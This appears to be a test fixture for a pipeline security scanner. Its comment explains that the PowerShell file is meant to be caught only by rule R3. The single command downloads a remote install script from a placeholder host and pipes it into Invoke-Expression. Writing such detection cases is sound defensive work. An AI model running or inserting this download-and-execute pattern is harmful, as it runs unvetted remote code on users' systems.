# Case r3_pipe_iex: a PowerShell script under pipelines/ that pipes a download into
# Invoke-Expression. It is not YAML, so R2 never reads it: only R3 can catch it.
irm https://example.invalid/install.ps1 | iex
